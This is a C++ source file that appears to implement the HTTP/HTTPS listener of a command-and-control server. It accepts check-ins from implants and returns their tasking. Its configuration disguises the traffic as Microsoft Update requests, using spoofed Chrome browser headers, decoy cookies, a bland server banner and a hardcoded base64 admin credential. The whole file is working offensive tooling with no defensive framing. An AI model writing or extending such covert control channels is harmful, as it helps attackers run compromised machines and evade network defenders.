#include "ListenerHttp.hpp"


using namespace std;
using namespace httplib;


// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server#examples
json ListenerHttpConfig = {
	{"http-post", {
		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
		{"client", {
			{"headers", {
                {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
                {"Content-Type","text/plain;charset=UTF-8"},
                {"Content-Language","fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
				{"Authorization", "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="},
                {"Keep-Alive", "timeout=5, max=1000"},
                {"Connection","Keep-Alive"},
                {"Cookie","PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"},
                {"Accept","*/*"},
                {"Sec-Ch-Ua","\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""},
                {"Sec-Ch-Ua-Platform","Windows"}
            }}
		}},
		{"server", {
			{"headers", {
                {"Access-Control-Allow-Origin", "true"},
                {"Connection","Keep-Alive"},
                {"Content-Type","application/json"},
                {"Server","Server"},
                {"Strict-Transport-Security","max-age=47474747; includeSubDomains; preload"},
                {"Vary","Origin,Content-Type,Accept-Encoding,User-Agent"}
            }}
		}}
  	}},
	{"https-post", {
		{"uri", {"/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"}},
		{"client", {
			{"headers", {
                {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"},
                {"Content-Type","text/plain;charset=UTF-8"},
                {"Content-Language","fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
				{"Authorization", "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="},
                {"Keep-Alive", "timeout=5, max=1000"},
                {"Connection","Keep-Alive"},
                {"Cookie","PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"},
                {"Accept","*/*"},
                {"Sec-Ch-Ua","\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""},
                {"Sec-Ch-Ua-Platform","Windows"}
            }}
		}},
		{"server", {
			{"headers", {
                {"Access-Control-Allow-Origin", "true"},
                {"Connection","Keep-Alive"},
                {"Content-Type","application/json"},
                {"Server","Server"},
                {"Strict-Transport-Security","max-age=47474747; includeSubDomains; preload"},
                {"Vary","Origin,Content-Type,Accept-Encoding,User-Agent"}
            }}
		}}
  	}}
};


ListenerHttp::ListenerHttp(const std::string& ip, int localPort, bool isHttps)
	: Listener(ip, localPort, (isHttps==true) ? ListenerHttpsType : ListenerHttpType)
	, m_isHttps(isHttps)
{	


	if(m_isHttps)
		m_svr = std::make_unique<httplib::SSLServer>("./cert.pem", "./key.pem");
	else
		m_svr = std::make_unique<httplib::Server>();

	this->m_httpServ = std::make_unique<std::thread>(&ListenerHttp::lauchHttpServ, this);
}


ListenerHttp::~ListenerHttp()
{
	m_svr->stop();
	m_httpServ->join();
}


void ListenerHttp::lauchHttpServ()
{
	httplib::Response res;

	auto httpsUri = ListenerHttpConfig["https-post"]["uri"];
	auto httpUri = ListenerHttpConfig["http-post"]["uri"];

	m_svr->set_post_routing_handler([&](const auto& req, auto& res) 
	{
		bool isHttpUri = false;
		for (json::iterator it = httpUri.begin(); it != httpUri.end(); ++it)
			if(req.path ==*it)
				isHttpUri=true;

		bool isHttpsUri = false;
		for (json::iterator it = httpsUri.begin(); it != httpsUri.end(); ++it)
			if(req.path ==*it)
				isHttpsUri=true;

		if ( (m_isHttps && isHttpsUri) ||  (!m_isHttps && isHttpUri) ) 
		{
			try 
			{
				DEBUG("Connection " << req.path);
				this->HandleCheckIn(req, res);
				res.status = 200;
				return Server::HandlerResponse::Handled;
			} 
			catch(const std::exception& ex)
			{
				DEBUG("Execption " << ex.what());
				res.status = 401;
				return Server::HandlerResponse::Handled;
			}
			catch (...) 
			{
				DEBUG("Unknown failure occurred.");
				res.status = 401;
				return Server::HandlerResponse::Handled;
			}
		}
		else
		{
			DEBUG("Unauthorized connection " << req.path);
			res.status = 401;
			return Server::HandlerResponse::Handled;
		}
	});

	m_svr->listen(m_host.c_str(), m_port);
}


int ListenerHttp::HandleCheckIn(const httplib::Request& req, httplib::Response& res)
{
	string input = req.body;

	DEBUG("m_isHttps " << std::to_string(m_isHttps));
	DEBUG("input.size " << std::to_string(input.size()));

	string output;
	bool ret = handleMessages(input, output);

	json httpHeaders = ListenerHttpConfig["http-post"]["server"]["headers"];
	if(m_isHttps)
		httpHeaders = ListenerHttpConfig["https-post"]["server"]["headers"];

	httplib::Headers httpServerHeaders;
	for (auto& it : httpHeaders.items())
		httpServerHeaders.insert({(it).key(), (it).value()});
	res.headers = httpServerHeaders;

	DEBUG("output.size " << std::to_string(output.size()));

	if(ret)
		res.body = output;
	else
		res.status = 200;

	return 0;
}
